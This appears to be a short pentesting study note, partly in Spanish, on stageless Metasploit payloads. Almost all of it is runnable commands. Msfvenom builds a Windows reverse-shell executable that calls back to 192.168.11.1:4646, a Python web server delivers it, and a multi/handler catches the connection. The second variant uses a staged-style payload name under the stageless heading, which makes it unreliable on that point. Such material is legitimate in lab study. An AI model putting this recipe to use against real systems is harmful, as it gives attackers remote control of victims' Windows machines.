> **Non-staged (or stageless) payloads** deliver the entire payload in a single step.  They are self-contained, execute immediately, and are faster and more reliable in unstable network conditions. However, their larger size makes them more likely to be detected by antivirus or IDS systems, and they lack the flexibility for dynamic modification after delivery.

- no estan fragmentados por lo que son mas grandes en tamanio
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp --platform windows -a x64 LHOST=192.168.11.1 LPORT=4646 -f exe -o reverse.exe
 
python -m http.server 1212

msfdb run
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
show options
set LHOST 192.168.11.1
set LPORT 4646
run
```

## Otra forma
```bash
msfvenom -p windows/x64/shell/reverse_tcp --platform windows -a x64 LHOST=192.168.11.1 LPORT=4646 -f exe -o reverse.exe
 
python -m http.server 1212

msfdb run
use exploit/multi/handler
set payload windows/x64/shell/reverse_tcp
show options
set LHOST 192.168.11.1
set LPORT 4646
run
```
